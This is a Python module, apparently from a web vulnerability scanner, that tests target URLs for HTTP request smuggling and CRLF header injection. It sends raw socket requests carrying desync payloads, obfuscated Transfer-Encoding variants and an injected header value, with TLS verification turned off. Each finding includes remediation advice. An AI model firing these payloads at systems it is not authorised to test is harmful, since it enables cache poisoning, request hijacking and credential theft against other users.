"""
HTTP Request Smuggling Module

Tests for HTTP Request Smuggling vulnerabilities (CL.TE, TE.CL, TE.TE).
Uses raw socket connections since HTTP clients normalize Transfer-Encoding headers.

Detection methods:
- Timing differential: smuggled request causes 5+ second delay
- Response poisoning: next request returns unexpected content
- Connection reset patterns
"""
import asyncio
import logging
import random
import ssl
import time
from urllib.parse import urlparse

from app.utils.http_client import get_random_ua

logger = logging.getLogger(__name__)


class RequestSmugglingModule:
    """Tests for HTTP Request Smuggling (CL.TE, TE.CL, TE.TE)."""

    # Obfuscated Transfer-Encoding variants for TE.TE detection
    TE_OBFUSCATIONS = [
        "Transfer-Encoding : chunked",
        "Transfer-encoding: chunked",
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding: chunked\r\nX-Padding: x",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding: chunked\r\n ",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding: identity, chunked",
        "Transfer-Encoding:\x0bchunked",
    ]

    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)
        self.timeout = 10.0
        self.smuggle_timeout = 15.0  # Longer timeout for timing-based detection

    async def run(self, context: dict) -> list[dict]:
        """Run all request smuggling tests against target URLs."""
        base_url = context.get("base_url", "")
        endpoints = context.get("endpoints", [])[:20]
        findings = []

        if not base_url:
            return findings

        # Build test URL list: base URL + top endpoints
        test_urls = [base_url]
        for ep in endpoints[:10]:
            if isinstance(ep, dict):
                url = ep.get("url", "")
            else:
                url = str(ep)
            if url and url not in test_urls:
                test_urls.append(url)

        for url in test_urls:
            try:
                # Test CL.TE
                result = await self._test_cl_te(url)
                if result:
                    findings.append(result)

                # Test TE.CL
                result = await self._test_te_cl(url)
                if result:
                    findings.append(result)

                # Test TE.TE obfuscation
                result = await self._test_te_te(url)
                if result:
                    findings.append(result)

                # Test CL-CL discrepancy (duplicate Content-Length)
                result = await self._test_cl_cl(url)
                if result:
                    findings.append(result)

                # Test header injection via newlines (HTTP header splitting)
                result = await self._test_header_injection(url)
                if result:
                    findings.append(result)

            except Exception as e:
                logger.debug(f"Request smuggling test error for {url}: {e}")

        return findings

    async def _raw_request(self, host: str, port: int, use_ssl: bool, raw_data: bytes,
                           timeout: float = None) -> tuple[float, str, bool]:
        """Send raw HTTP request via socket and return (elapsed_time, response, connection_reset).

        Returns:
            (elapsed_seconds, response_text, was_connection_reset)
        """
        timeout = timeout or self.timeout
        async with self.rate_limit:
            reader = None
            writer = None
            try:
                if use_ssl:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port, ssl=ssl_ctx),
                        timeout=timeout
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port),
                        timeout=timeout
                    )

                start = time.monotonic()
                writer.write(raw_data)
                await writer.drain()

                response_data = b""
                try:
                    response_data = await asyncio.wait_for(
                        reader.read(65536),
                        timeout=timeout
                    )
                except asyncio.TimeoutError:
                    elapsed = time.monotonic() - start
                    return elapsed, "", False

                elapsed = time.monotonic() - start
                return elapsed, response_data.decode("utf-8", errors="replace"), False

            except ConnectionResetError:
                return 0.0, "", True
            except Exception as e:
                logger.debug(f"Raw request error to {host}:{port}: {e}")
                return 0.0, "", False
            finally:
                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass

    def _parse_url(self, url: str) -> tuple[str, int, bool, str]:
        """Parse URL into (host, port, use_ssl, path)."""
        parsed = urlparse(url)
        host = parsed.hostname or ""
        use_ssl = parsed.scheme == "https"
        port = parsed.port or (443 if use_ssl else 80)
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        return host, port, use_ssl, path

    async def _get_baseline_time(self, host: str, port: int, use_ssl: bool, path: str) -> float:
        """Measure baseline response time with a normal request."""
        ua = get_random_ua()
        normal_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        times = []
        for _ in range(3):
            elapsed, resp, reset = await self._raw_request(host, port, use_ssl, normal_req)
            if resp and elapsed > 0:
                times.append(elapsed)
            await asyncio.sleep(0.2)

        return max(times) if times else 2.0

    async def _test_cl_te(self, url: str) -> dict | None:
        """CL.TE detection via timing differential.

        Frontend uses Content-Length (forwards entire body), backend uses Transfer-Encoding
        (sees 0-length chunk = end, queues remainder as next request).
        The smuggled portion causes the backend to wait for a complete next request,
        producing a timeout differential.
        """
        host, port, use_ssl, path = self._parse_url(url)
        if not host:
            return None

        try:
            baseline = await self._get_baseline_time(host, port, use_ssl, path)
            threshold = max(5.0, baseline * 4)

            ua = get_random_ua()
            # Smuggled body: 0-chunk ends the request for TE parser,
            # but CL says body is longer, so the leftover "G" starts a new incomplete request
            # that the backend waits on (timing detection)
            smuggled_body = "0\r\n\r\nG"
            content_length = len(smuggled_body)

            smuggle_req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {content_length + 4}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{smuggled_body}"
            ).encode()

            elapsed, response, reset = await self._raw_request(
                host, port, use_ssl, smuggle_req, timeout=self.smuggle_timeout
            )

            if reset:
                logger.debug(f"CL.TE: Connection reset at {url} — possible detection/blocking")
                return None

            # Timing-based detection: if backend waited significantly longer
            if elapsed > threshold:
                return {
                    "title": f"HTTP Request Smuggling (CL.TE) at {path}",
                    "url": url,
                    "severity": "high",
                    "vuln_type": "misconfiguration",
                    "description": (
                        f"HTTP Request Smuggling vulnerability detected via CL.TE desync. "
                        f"The frontend server uses Content-Length while the backend uses "
                        f"Transfer-Encoding: chunked, allowing an attacker to smuggle requests "
                        f"through the frontend proxy. Baseline response: {baseline:.2f}s, "
                        f"smuggled response: {elapsed:.2f}s (threshold: {threshold:.2f}s)."
                    ),
                    "impact": (
                        "An attacker can bypass security controls, poison web caches, "
                        "hijack other users' requests, steal credentials, and perform "
                        "cross-site scripting attacks against other users."
                    ),
                    "remediation": (
                        "1. Configure both frontend and backend to use the same TE/CL behavior. "
                        "2. Normalize or reject ambiguous requests at the proxy level. "
                        "3. Use HTTP/2 end-to-end (not susceptible to smuggling). "
                        "4. Disable backend connection reuse if possible."
                    ),
                    "payload": f"POST with CL={content_length + 4} + TE:chunked, body ends with partial request",
                    "proof": f"Timing differential: baseline={baseline:.2f}s, smuggle={elapsed:.2f}s",
                    "method": "POST",
                }

            # Response-based: check if next request gets poisoned
            await self._check_response_poisoning(host, port, use_ssl, path, smuggle_req)

        except Exception as e:
            logger.debug(f"CL.TE test error for {url}: {e}")

        return None

    async def _test_te_cl(self, url: str) -> dict | None:
        """TE.CL detection via timing differential.

        Frontend uses Transfer-Encoding (processes chunks), backend uses Content-Length.
        Send chunked body where the last chunk contains a partial smuggled request.
        Backend reads only CL bytes, leaving the smuggled portion in the buffer.
        """
        host, port, use_ssl, path = self._parse_url(url)
        if not host:
            return None

        try:
            baseline = await self._get_baseline_time(host, port, use_ssl, path)
            threshold = max(5.0, baseline * 4)

            ua = get_random_ua()
            # Chunked body: first chunk is "0\r\n\r\n" (end marker), but CL is small
            # The backend reads CL bytes, rest stays in connection buffer
            chunk_body = "5\r\nGPOST\r\n0\r\n\r\n"

            smuggle_req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{chunk_body}"
            ).encode()

            elapsed, response, reset = await self._raw_request(
                host, port, use_ssl, smuggle_req, timeout=self.smuggle_timeout
            )

            if reset:
                logger.debug(f"TE.CL: Connection reset at {url}")
                return None

            if elapsed > threshold:
                return {
                    "title": f"HTTP Request Smuggling (TE.CL) at {path}",
                    "url": url,
                    "severity": "critical",
                    "vuln_type": "misconfiguration",
                    "description": (
                        f"HTTP Request Smuggling vulnerability detected via TE.CL desync. "
                        f"The frontend processes Transfer-Encoding: chunked while the backend "
                        f"uses Content-Length, allowing smuggling of arbitrary requests. "
                        f"Baseline: {baseline:.2f}s, smuggled: {elapsed:.2f}s."
                    ),
                    "impact": (
                        "TE.CL smuggling is often more exploitable than CL.TE. An attacker can "
                        "fully control the smuggled request, allowing cache poisoning, credential "
                        "theft, request hijacking, and bypassing all frontend security controls "
                        "including WAFs and access restrictions."
                    ),
                    "remediation": (
                        "1. Reject requests with both Content-Length and Transfer-Encoding. "
                        "2. Configure frontend and backend to agree on which header takes precedence. "
                        "3. Use HTTP/2 end-to-end. "
                        "4. Deploy a WAF rule that blocks ambiguous requests."
                    ),
                    "payload": f"POST with CL=4 + TE:chunked, chunked body smuggles partial GPOST",
                    "proof": f"Timing differential: baseline={baseline:.2f}s, smuggle={elapsed:.2f}s",
                    "method": "POST",
                }

        except Exception as e:
            logger.debug(f"TE.CL test error for {url}: {e}")

        return None

    async def _test_te_te(self, url: str) -> dict | None:
        """TE.TE detection with obfuscated Transfer-Encoding headers.

        Both servers support TE, but one ignores an obfuscated variant.
        Test various TE header mutations to find desync.
        """
        host, port, use_ssl, path = self._parse_url(url)
        if not host:
            return None

        try:
            baseline = await self._get_baseline_time(host, port, use_ssl, path)
            threshold = max(5.0, baseline * 4)

            ua = get_random_ua()

            for te_variant in self.TE_OBFUSCATIONS[:5]:  # Test top 5 variants
                chunk_body = "0\r\n\r\nGPOST / HTTP/1.1\r\nHost: a\r\n\r\n"

                smuggle_req = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 4\r\n"
                    f"{te_variant}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                    f"{chunk_body}"
                ).encode()

                elapsed, response, reset = await self._raw_request(
                    host, port, use_ssl, smuggle_req, timeout=self.smuggle_timeout
                )

                if reset:
                    continue

                if elapsed > threshold:
                    return {
                        "title": f"HTTP Request Smuggling (TE.TE obfuscation) at {path}",
                        "url": url,
                        "severity": "high",
                        "vuln_type": "misconfiguration",
                        "description": (
                            f"HTTP Request Smuggling via Transfer-Encoding obfuscation. "
                            f"The frontend and backend disagree on how to parse the obfuscated "
                            f"TE header '{te_variant.strip()}', creating a desync condition. "
                            f"Baseline: {baseline:.2f}s, smuggled: {elapsed:.2f}s."
                        ),
                        "impact": (
                            "Request smuggling allows cache poisoning, credential theft, "
                            "request hijacking, and security control bypass."
                        ),
                        "remediation": (
                            "1. Strictly validate Transfer-Encoding headers — reject any non-standard variants. "
                            "2. Use HTTP/2 end-to-end. "
                            "3. Configure the proxy to normalize TE headers before forwarding."
                        ),
                        "payload": f"TE header variant: {te_variant.strip()}, CL=4, chunked smuggle body",
                        "proof": f"Timing differential: baseline={baseline:.2f}s, smuggle={elapsed:.2f}s",
                        "method": "POST",
                    }

                await asyncio.sleep(0.3)

        except Exception as e:
            logger.debug(f"TE.TE test error for {url}: {e}")

        return None

    async def _check_response_poisoning(self, host: str, port: int, use_ssl: bool,
                                         path: str, smuggle_req: bytes) -> dict | None:
        """Send smuggle request, then immediately send a normal request on the same connection.
        If the normal request gets an unexpected response, the cache/connection was poisoned."""
        try:
            ua = get_random_ua()
            # Unique marker to detect poisoning
            marker = f"phantom-smuggle-{random.randint(100000, 999999)}"

            # Normal follow-up request
            normal_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"X-Phantom-Check: {marker}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()

            # Send both on one connection
            combined = smuggle_req + normal_req

            ssl_ctx = None
            if use_ssl:
                ssl_ctx = ssl.create_default_context()
                ssl_ctx.check_hostname = False
                ssl_ctx.verify_mode = ssl.CERT_NONE

            async with self.rate_limit:
                if use_ssl:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port, ssl=ssl_ctx),
                        timeout=self.timeout
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port),
                        timeout=self.timeout
                    )

                writer.write(combined)
                await writer.drain()

                response = b""
                try:
                    while True:
                        chunk = await asyncio.wait_for(reader.read(65536), timeout=self.timeout)
                        if not chunk:
                            break
                        response += chunk
                except asyncio.TimeoutError:
                    pass
                finally:
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass

                resp_text = response.decode("utf-8", errors="replace")
                # Check for signs of poisoning: unexpected status, method not allowed, etc.
                responses = resp_text.split("HTTP/1.")
                if len(responses) >= 3:
                    # Got multiple responses — check if second one is unexpected
                    second_resp = responses[2] if len(responses) > 2 else ""
                    if "405" in second_resp or "400" in second_resp:
                        logger.info(f"Possible response poisoning detected at {host}{path}")
                        return {
                            "title": f"HTTP Request Smuggling (response poisoning) at {path}",
                            "url": f"{'https' if use_ssl else 'http'}://{host}:{port}{path}",
                            "severity": "critical",
                            "vuln_type": "misconfiguration",
                            "description": "Response poisoning detected — second request received unexpected status.",
                            "impact": "Request smuggling with response poisoning can affect other users.",
                            "remediation": "Normalize or reject ambiguous requests. Use HTTP/2 end-to-end.",
                            "payload": "Combined CL+TE smuggle followed by normal GET",
                            "proof": f"Second response contained unexpected status in pipelined response",
                        }

        except Exception as e:
            logger.debug(f"Response poisoning check error: {e}")

        return None

    async def _test_cl_cl(self, url: str) -> dict | None:
        """Duplicate Content-Length test.

        Some proxies use the first CL, backends the last (or vice versa).
        Send a request with two CL headers — if they disagree, the
        proxy forwards a different amount than the backend expects.
        """
        host, port, use_ssl, path = self._parse_url(url)
        if not host:
            return None

        try:
            baseline = await self._get_baseline_time(host, port, use_ssl, path)
            threshold = max(5.0, baseline * 4)

            ua = get_random_ua()
            body = "GPOST / HTTP/1.1\r\nHost: a\r\n\r\n"
            # Two CL headers: first says small (proxy forwards partial), second says full
            smuggle_req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 0\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{body}"
            ).encode()

            elapsed, response, reset = await self._raw_request(
                host, port, use_ssl, smuggle_req, timeout=self.smuggle_timeout
            )

            if reset:
                return None

            # If server processed the body (didn't reject duplicate CL)
            # and timing is anomalous, it's vulnerable
            if elapsed > threshold:
                return {
                    "title": f"HTTP Request Smuggling (CL-CL) at {path}",
                    "url": url,
                    "severity": "high",
                    "vuln_type": "misconfiguration",
                    "description": (
                        f"Server accepts duplicate Content-Length headers with different "
                        f"values. Frontend and backend may disagree on body boundaries, "
                        f"enabling request smuggling. "
                        f"Baseline: {baseline:.2f}s, test: {elapsed:.2f}s."
                    ),
                    "impact": (
                        "Duplicate CL smuggling enables request hijacking, cache poisoning, "
                        "and security control bypass."
                    ),
                    "remediation": (
                        "Reject requests with duplicate Content-Length headers. "
                        "RFC 7230 Section 3.3.2 mandates rejection."
                    ),
                    "payload": "POST with two CL headers: CL:0 + CL:N",
                    "proof": f"Timing: baseline={baseline:.2f}s, smuggle={elapsed:.2f}s",
                    "method": "POST",
                }

            # Even without timing anomaly, check if server returns 400 (proper rejection)
            # vs processes normally (improper handling)
            if response and "400" not in response.split("\r\n")[0]:
                # Server accepted duplicate CL without rejecting — potential issue
                # but lower confidence without timing differential
                pass

        except Exception as e:
            logger.debug(f"CL-CL test error for {url}: {e}")

        return None

    async def _test_header_injection(self, url: str) -> dict | None:
        """Test for HTTP header injection via CRLF in header values.

        If a backend echoes or processes injected headers, it can lead to
        response splitting or request smuggling.
        """
        host, port, use_ssl, path = self._parse_url(url)
        if not host:
            return None

        try:
            ua = get_random_ua()
            marker = f"phantom-header-{random.randint(100000, 999999)}"

            # Inject CRLF in a header value to add a fake header
            injected_header = f"normalvalue\r\nX-Injected: {marker}"

            test_req = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"X-Test: {injected_header}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode()

            elapsed, response, reset = await self._raw_request(
                host, port, use_ssl, test_req
            )

            if response and marker in response:
                return {
                    "title": f"HTTP Header Injection (CRLF) at {path}",
                    "url": url,
                    "severity": "high",
                    "vuln_type": "misconfiguration",
                    "description": (
                        "Server is vulnerable to CRLF injection in HTTP headers. "
                        "An injected header value containing \\r\\n was reflected "
                        "in the response, indicating the server does not sanitize "
                        "header values."
                    ),
                    "impact": (
                        "HTTP response splitting allows cache poisoning, XSS via "
                        "injected response headers, and session fixation."
                    ),
                    "remediation": (
                        "Strip or reject CRLF characters in all header values. "
                        "Use a modern HTTP framework that handles this automatically."
                    ),
                    "payload": f"X-Test: value\\r\\nX-Injected: {marker}",
                    "proof": f"Injected header marker '{marker}' reflected in response",
                    "method": "GET",
                }

        except Exception as e:
            logger.debug(f"Header injection test error for {url}: {e}")

        return None
